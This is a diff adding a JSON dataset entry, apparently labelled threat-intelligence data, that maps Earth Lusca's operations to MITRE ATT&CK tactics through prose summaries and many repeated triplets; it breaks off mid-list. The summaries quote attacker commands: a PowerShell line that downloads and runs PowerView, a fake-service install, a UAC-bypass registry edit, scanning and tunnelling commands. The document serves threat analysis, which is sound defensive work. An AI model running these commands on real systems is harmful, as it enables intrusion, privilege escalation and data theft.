@@ -1,0 +1,1291 @@
+{
+    "file_name": "technical-brief-delving-deep-an-analysis-of-earth-lusca-operations",
+    "tactic_label": true,
+    "rewrite": {
+        "Reconnaissance": "During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.",
+        "Initial Access": "Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.",
+        "Execution": "The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create \"SysUpdate\" binpath= \"cmd /c start \"[file path]\"\"&&sc config \"SysUpdate\" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.",
+        "Persistence": "To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.",
+        "Privilege Escalation": "Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command\\ /t REG_SZ /d \"%appdata%\\[file name]\" /f' to bypass User Account Control (UAC) and gain elevated privileges.",
+        "Defense Evasion": "The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.",
+        "Credential Access": "Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.",
+        "Discovery": "The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.",
+        "Lateral Movement": "Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.",
+        "Collection": "The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.",
+        "Command and Control": "For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.",
+        "Exfiltration": "To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network."
+    },
+    "technique_label": true,
+    "triplet_groups": {
+        "Initial Access": {
+            "T1189-Drive-by Compromise": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "utilized",
+                    "Object": "various initial access vectors",
+                    "ObjectType": "attack-pattern",
+                    "tactic": "Initial Access",
+                    "technique": [
+                        "T1189-Drive-by Compromise",
+                        "T1566-Phishing",
+                        "T1190-Exploit Public-Facing Application"
+                    ],
+                    "id": 1
+                },
+                {
+                    "Subject": "They",
+                    "SubjectType": "threat-actor",
+                    "Relation": "compromised",
+                    "Object": "websites",
+                    "ObjectType": "infrastrcucture",
+                    "tactic": "Initial Access",
+                    "technique": [
+                        "T1189-Drive-by Compromise"
+                    ],
+                    "id": 3
+                },
+                {
+                    "Subject": "They",
+                    "SubjectType": "threat-actor",
+                    "Relation": "created",
+                    "Object": "fake web pages",
+                    "ObjectType": "infrastrcucture",
+                    "tactic": "Initial Access",
+                    "technique": [
+                        "T1189-Drive-by Compromise"
+                    ],
+                    "id": 4
+                },
+                {
+                    "Subject": "Injected malicious JavaScript code",
+                    "SubjectType": "artifacts",
+                    "Relation": "to deliver",
+                    "Object": "malware",
+                    "ObjectType": "Malware",
+                    "tactic": "Initial Access",
+                    "technique": [
+                        "T1189-Drive-by Compromise"
+                    ],
+                    "id": 5
+                }
+            ],
+            "T1566-Phishing": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "utilized",
+                    "Object": "various initial access vectors",
+                    "ObjectType": "attack-pattern",
+                    "tactic": "Initial Access",
+                    "technique": [
+                        "T1189-Drive-by Compromise",
+                        "T1566-Phishing",
+                        "T1190-Exploit Public-Facing Application"
+                    ],
+                    "id": 1
+                },
+                {
+                    "Subject": "They",
+                    "SubjectType": "threat-actor",
+                    "Relation": "sent",
+                    "Object": "spear phishing emails",
+                    "ObjectType": "Email Message",
+                    "tactic": "Initial Access",
+                    "technique": [
+                        "T1566-Phishing"
+                    ],
+                    "id": 2
+                }
+            ],
+            "T1190-Exploit Public-Facing Application": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "utilized",
+                    "Object": "various initial access vectors",
+                    "ObjectType": "attack-pattern",
+                    "tactic": "Initial Access",
+                    "technique": [
+                        "T1189-Drive-by Compromise",
+                        "T1566-Phishing",
+                        "T1190-Exploit Public-Facing Application"
+                    ],
+                    "id": 1
+                }
+            ]
+        },
+        "Execution": {
+            "T1059-Command and Scripting Interpreter": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "command and scripting interpreters",
+                    "ObjectType": "technique",
+                    "tactic": "Execution",
+                    "technique": [
+                        "T1059-Command and Scripting Interpreter"
+                    ],
+                    "id": 6
+                }
+            ],
+            "T1610-Deploy Container": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "deploy",
+                    "Object": "containers",
+                    "ObjectType": "technique",
+                    "tactic": "Execution",
+                    "technique": [
+                        "T1610-Deploy Container"
+                    ],
+                    "id": 7
+                }
+            ],
+            "T1053-Scheduled Task/Job": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "schedule",
+                    "Object": "tasks/jobs",
+                    "ObjectType": "technique",
+                    "tactic": "Execution",
+                    "technique": [
+                        "T1053-Scheduled Task/Job"
+                    ],
+                    "id": 8
+                }
+            ]
+        },
+        "Persistence": {
+            "T1543-Create or Modify System Process": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "create",
+                    "Object": "services",
+                    "ObjectType": "software",
+                    "tactic": "Persistence",
+                    "technique": [
+                        "T1543-Create or Modify System Process"
+                    ],
+                    "id": 12
+                }
+            ],
+            "T1053-Scheduled Task/Job": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "schedule",
+                    "Object": "tasks",
+                    "ObjectType": "task",
+                    "tactic": "Persistence",
+                    "technique": [
+                        "T1053-Scheduled Task/Job"
+                    ],
+                    "id": 13
+                }
+            ],
+            "T1037-Boot or Logon Initialization Scripts": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "register",
+                    "Object": "initialization scripts",
+                    "ObjectType": "file",
+                    "tactic": "Persistence",
+                    "technique": [
+                        "T1037-Boot or Logon Initialization Scripts"
+                    ],
+                    "id": 14
+                }
+            ]
+        },
+        "Defense Evasion": {
+            "T1548-Abuse Elevation Control Mechanism": [
+                {
+                    "Subject": "The group",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "defense evasion techniques",
+                    "ObjectType": "technique",
+                    "tactic": "Defense Evasion",
+                    "technique": [
+                        "T1548-Abuse Elevation Control Mechanism",
+                        "T1197-BITS Jobs",
+                        "T1140-Deobfuscate/Decode Files or Information",
+                        "T1610-Deploy Container",
+                        "T1574-Hijack Execution Flow",
+                        "T1562-Impair Defenses",
+                        "T1112-Modify Registry",
+                        "T1218-System Binary Proxy Execution"
+                    ],
+                    "id": 15
+                }
+            ],
+            "T1197-BITS Jobs": [
+                {
+                    "Subject": "The group",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "defense evasion techniques",
+                    "ObjectType": "technique",
+                    "tactic": "Defense Evasion",
+                    "technique": [
+                        "T1548-Abuse Elevation Control Mechanism",
+                        "T1197-BITS Jobs",
+                        "T1140-Deobfuscate/Decode Files or Information",
+                        "T1610-Deploy Container",
+                        "T1574-Hijack Execution Flow",
+                        "T1562-Impair Defenses",
+                        "T1112-Modify Registry",
+                        "T1218-System Binary Proxy Execution"
+                    ],
+                    "id": 15
+                }
+            ],
+            "T1140-Deobfuscate/Decode Files or Information": [
+                {
+                    "Subject": "The group",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "defense evasion techniques",
+                    "ObjectType": "technique",
+                    "tactic": "Defense Evasion",
+                    "technique": [
+                        "T1548-Abuse Elevation Control Mechanism",
+                        "T1197-BITS Jobs",
+                        "T1140-Deobfuscate/Decode Files or Information",
+                        "T1610-Deploy Container",
+                        "T1574-Hijack Execution Flow",
+                        "T1562-Impair Defenses",
+                        "T1112-Modify Registry",
+                        "T1218-System Binary Proxy Execution"
+                    ],
+                    "id": 15
+                }
+            ],
+            "T1610-Deploy Container": [
+                {
+                    "Subject": "The group",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "defense evasion techniques",
+                    "ObjectType": "technique",
+                    "tactic": "Defense Evasion",
+                    "technique": [
+                        "T1548-Abuse Elevation Control Mechanism",
+                        "T1197-BITS Jobs",
+                        "T1140-Deobfuscate/Decode Files or Information",
+                        "T1610-Deploy Container",
+                        "T1574-Hijack Execution Flow",
+                        "T1562-Impair Defenses",
+                        "T1112-Modify Registry",
+                        "T1218-System Binary Proxy Execution"
+                    ],
+                    "id": 15
+                }
+            ],
+            "T1574-Hijack Execution Flow": [
+                {
+                    "Subject": "The group",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "defense evasion techniques",
+                    "ObjectType": "technique",
+                    "tactic": "Defense Evasion",
+                    "technique": [
+                        "T1548-Abuse Elevation Control Mechanism",
+                        "T1197-BITS Jobs",
+                        "T1140-Deobfuscate/Decode Files or Information",
+                        "T1610-Deploy Container",
+                        "T1574-Hijack Execution Flow",
+                        "T1562-Impair Defenses",
+                        "T1112-Modify Registry",
+                        "T1218-System Binary Proxy Execution"
+                    ],
+                    "id": 15
+                }
+            ],
+            "T1562-Impair Defenses": [
+                {
+                    "Subject": "The group",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "defense evasion techniques",
+                    "ObjectType": "technique",
+                    "tactic": "Defense Evasion",
+                    "technique": [
+                        "T1548-Abuse Elevation Control Mechanism",
+                        "T1197-BITS Jobs",
+                        "T1140-Deobfuscate/Decode Files or Information",
+                        "T1610-Deploy Container",
+                        "T1574-Hijack Execution Flow",
+                        "T1562-Impair Defenses",
+                        "T1112-Modify Registry",
+                        "T1218-System Binary Proxy Execution"
+                    ],
+                    "id": 15
+                }
+            ],
+            "T1112-Modify Registry": [
+                {
+                    "Subject": "The group",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "defense evasion techniques",
+                    "ObjectType": "technique",
+                    "tactic": "Defense Evasion",
+                    "technique": [
+                        "T1548-Abuse Elevation Control Mechanism",
+                        "T1197-BITS Jobs",
+                        "T1140-Deobfuscate/Decode Files or Information",
+                        "T1610-Deploy Container",
+                        "T1574-Hijack Execution Flow",
+                        "T1562-Impair Defenses",
+                        "T1112-Modify Registry",
+                        "T1218-System Binary Proxy Execution"
+                    ],
+                    "id": 15
+                }
+            ],
+            "T1218-System Binary Proxy Execution": [
+                {
+                    "Subject": "The group",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "defense evasion techniques",
+                    "ObjectType": "technique",
+                    "tactic": "Defense Evasion",
+                    "technique": [
+                        "T1548-Abuse Elevation Control Mechanism",
+                        "T1197-BITS Jobs",
+                        "T1140-Deobfuscate/Decode Files or Information",
+                        "T1610-Deploy Container",
+                        "T1574-Hijack Execution Flow",
+                        "T1562-Impair Defenses",
+                        "T1112-Modify Registry",
+                        "T1218-System Binary Proxy Execution"
+                    ],
+                    "id": 15
+                },
+                {
+                    "Subject": "The group",
+                    "SubjectType": "threat-actor",
+                    "Relation": "leverage",
+                    "Object": "valid code-signed executions",
+                    "ObjectType": "technique",
+                    "tactic": "Defense Evasion",
+                    "technique": [
+                        "T1218-System Binary Proxy Execution"
+                    ],
+                    "id": 16
+                }
+            ],
+            "T1027-Obfuscated Files or Information": [
+                {
+                    "Subject": "The group",
+                    "SubjectType": "threat-actor",
+                    "Relation": "employ",
+                    "Object": "various obfuscation techniques",
+                    "ObjectType": "technique",
+                    "tactic": "Defense Evasion",
+                    "technique": [
+                        "T1027-Obfuscated Files or Information"
+                    ],
+                    "id": 17
+                }
+            ]
+        },
+        "Credential Access": {
+            "T1555-Credentials from Password Stores": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "target",
+                    "Object": "user credentials",
+                    "ObjectType": "artifact",
+                    "tactic": "Credential Access",
+                    "technique": [
+                        "T1555-Credentials from Password Stores"
+                    ],
+                    "id": 18
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "procdump",
+                    "ObjectType": "tool",
+                    "tactic": "Credential Access",
+                    "technique": [
+                        "T1555-Credentials from Password Stores"
+                    ],
+                    "id": 19
+                },
+                {
+                    "Subject": "procdump",
+                    "SubjectType": "tool",
+                    "Relation": "dump",
+                    "Object": "the memory of the lsass process",
+                    "ObjectType": "process",
+                    "tactic": "Credential Access",
+                    "technique": [
+                        "T1555-Credentials from Password Stores"
+                    ],
+                    "id": 20
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "exploit",
+                    "Object": "the domain controller",
+                    "ObjectType": "infrastructure",
+                    "tactic": "Credential Access",
+                    "technique": [
+                        "T1555-Credentials from Password Stores"
+                    ],
+                    "id": 21
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "Mimikatz",
+                    "ObjectType": "tool",
+                    "tactic": "Credential Access",
+                    "technique": [
+                        "T1555-Credentials from Password Stores"
+                    ],
+                    "id": 22
+                },
+                {
+                    "Subject": "Mimikatz",
+                    "SubjectType": "tool",
+                    "Relation": "retrieve",
+                    "Object": "credentials",
+                    "ObjectType": "artifact",
+                    "tactic": "Credential Access",
+                    "technique": [
+                        "T1555-Credentials from Password Stores"
+                    ],
+                    "id": 23
+                }
+            ]
+        },
+        "Collection": {
+            "T1005-Data from Local System": [
+                {
+                    "Subject": "The group",
+                    "SubjectType": "threat-actor",
+                    "Relation": "collect",
+                    "Object": "data from local systems and network shared drives",
+                    "ObjectType": "artifacts",
+                    "tactic": "Collection",
+                    "technique": [
+                        "T1005-Data from Local System",
+                        "T1039-Data from Network Shared Drive"
+                    ],
+                    "id": 24
+                }
+            ],
+            "T1039-Data from Network Shared Drive": [
+                {
+                    "Subject": "The group",
+                    "SubjectType": "threat-actor",
+                    "Relation": "collect",
+                    "Object": "data from local systems and network shared drives",
+                    "ObjectType": "artifacts",
+                    "tactic": "Collection",
+                    "technique": [
+                        "T1005-Data from Local System",
+                        "T1039-Data from Network Shared Drive"
+                    ],
+                    "id": 24
+                }
+            ],
+            "T1114-Email Collection": [
+                {
+                    "Subject": "The group",
+                    "SubjectType": "threat-actor",
+                    "Relation": "capture",
+                    "Object": "email and screen data",
+                    "ObjectType": "artifacts",
+                    "tactic": "Collection",
+                    "technique": [
+                        "T1114-Email Collection"
+                    ],
+                    "id": 25
+                }
+            ],
+            "T1560-Archive Collected Data": [
+                {
+                    "Subject": "They",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "WinRAR",
+                    "ObjectType": "tool",
+                    "tactic": "Collection",
+                    "technique": [
+                        "T1560-Archive Collected Data"
+                    ],
+                    "id": 26
+                },
+                {
+                    "Subject": "They",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "megacmd",
+                    "ObjectType": "tool",
+                    "tactic": "Collection",
+                    "technique": [
+                        "T1560-Archive Collected Data"
+                    ],
+                    "id": 27
+                },
+                {
+                    "Subject": "They",
+                    "SubjectType": "threat-actor",
+                    "Relation": "exfiltrate-to",
+                    "Object": "Mega service",
+                    "ObjectType": "infrastrcucture",
+                    "tactic": "Collection",
+                    "technique": [
+                        "T1560-Archive Collected Data"
+                    ],
+                    "id": 28
+                }
+            ]
+        },
+        "Command and Control": {
+            "T1071-Application Layer Protocol": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "application layer protocols",
+                    "ObjectType": "technique",
+                    "tactic": "Command and Control",
+                    "technique": [
+                        "T1071-Application Layer Protocol"
+                    ],
+                    "id": 29
+                }
+            ],
+            "T1001-Data Obfuscation": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "data obfuscation",
+                    "ObjectType": "technique",
+                    "tactic": "Command and Control",
+                    "technique": [
+                        "T1001-Data Obfuscation"
+                    ],
+                    "id": 30
+                }
+            ],
+            "T1573-Encrypted Channel": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "encrypted channels",
+                    "ObjectType": "technique",
+                    "tactic": "Command and Control",
+                    "technique": [
+                        "T1573-Encrypted Channel"
+                    ],
+                    "id": 31
+                }
+            ],
+            "T1571-Non-Standard Port": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "non-standard ports",
+                    "ObjectType": "technique",
+                    "tactic": "Command and Control",
+                    "technique": [
+                        "T1571-Non-Standard Port"
+                    ],
+                    "id": 32
+                }
+            ],
+            "T1572-Protocol Tunneling": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "protocol tunneling",
+                    "ObjectType": "technique",
+                    "tactic": "Command and Control",
+                    "technique": [
+                        "T1572-Protocol Tunneling"
+                    ],
+                    "id": 33
+                }
+            ],
+            "T1090-Proxy": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "proxies",
+                    "ObjectType": "technique",
+                    "tactic": "Command and Control",
+                    "technique": [
+                        "T1090-Proxy"
+                    ],
+                    "id": 34
+                }
+            ],
+            "T1219-Remote Access Software": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "remote access software",
+                    "ObjectType": "tool",
+                    "tactic": "Command and Control",
+                    "technique": [
+                        "T1219-Remote Access Software"
+                    ],
+                    "id": 35
+                }
+            ]
+        },
+        "Exfiltration": {
+            "T1537-Transfer Data to Cloud Account": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "megacmd",
+                    "ObjectType": "tool",
+                    "tactic": "Exfiltration",
+                    "technique": [
+                        "T1537-Transfer Data to Cloud Account"
+                    ],
+                    "id": 37
+                }
+            ],
+            "T1041-Exfiltration Over C2 Channel": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "exfiltrate-to",
+                    "Object": "C2 channels",
+                    "ObjectType": "network traffic",
+                    "tactic": "Exfiltration",
+                    "technique": [
+                        "T1041-Exfiltration Over C2 Channel"
+                    ],
+                    "id": 38
+                }
+            ]
+        },
+        "Reconnaissance": {
+            "T1595-Active Scanning": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "net",
+                    "ObjectType": "tool",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 39
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "nltest",
+                    "ObjectType": "tool",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 40
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "ipconfig",
+                    "ObjectType": "tool",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 41
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "netstat",
+                    "ObjectType": "tool",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 42
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "tasklist",
+                    "ObjectType": "tool",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 43
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "adfind",
+                    "ObjectType": "tool",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 44
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "PowerSploit",
+                    "ObjectType": "tool",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 45
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "download",
+                    "Object": "PowerView.ps1",
+                    "ObjectType": "file",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 46
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "discover",
+                    "Object": "machines in the same domain",
+                    "ObjectType": "infrastructure",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 47
+                }
+            ],
+            "T1592-Gather Victim Host Information": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "net",
+                    "ObjectType": "tool",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 39
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "nltest",
+                    "ObjectType": "tool",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 40
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "ipconfig",
+                    "ObjectType": "tool",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 41
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "netstat",
+                    "ObjectType": "tool",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 42
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "tasklist",
+                    "ObjectType": "tool",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 43
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "adfind",
+                    "ObjectType": "tool",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 44
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "PowerSploit",
+                    "ObjectType": "tool",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 45
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "download",
+                    "Object": "PowerView.ps1",
+                    "ObjectType": "file",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 46
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "discover",
+                    "Object": "machines in the same domain",
+                    "ObjectType": "infrastructure",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 47
+                }
+            ],
+            "T1590-Gather Victim Network Information": [
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "net",
+                    "ObjectType": "tool",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 39
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "nltest",
+                    "ObjectType": "tool",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 40
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "ipconfig",
+                    "ObjectType": "tool",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 41
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "netstat",
+                    "ObjectType": "tool",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 42
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "tasklist",
+                    "ObjectType": "tool",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 43
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "adfind",
+                    "ObjectType": "tool",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
+                        "T1590-Gather Victim Network Information"
+                    ],
+                    "id": 44
+                },
+                {
+                    "Subject": "Earth Lusca",
+                    "SubjectType": "threat-actor",
+                    "Relation": "use",
+                    "Object": "PowerSploit",
+                    "ObjectType": "tool",
+                    "tactic": "Reconnaissance",
+                    "technique": [
+                        "T1595-Active Scanning",
+                        "T1592-Gather Victim Host Information",
